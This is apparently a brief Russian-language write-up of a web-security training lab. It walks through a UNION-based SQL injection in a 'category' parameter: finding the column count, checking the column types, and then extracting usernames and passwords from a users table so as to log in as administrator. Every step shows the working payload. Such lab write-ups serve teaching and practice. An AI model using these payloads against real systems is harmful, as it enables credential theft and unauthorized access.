1) Переходим в категорию Lifestyle
2) Меняем запрос и видим, что таблица состоит из двух столбцов:
category=Lifestyle'+UNION+SELECT+NULL,NULL--
3) Убеждаемся, что тип данных - строки:
category=Lifestyle'+UNION+SELECT+'a','b'--
4) Забираем данные из таблицы users:
category=Lifestyle'+UNION+SELECT+username,password+FROM+users--
5) Находим administrator, забираем пароль и входим в систему как администратор.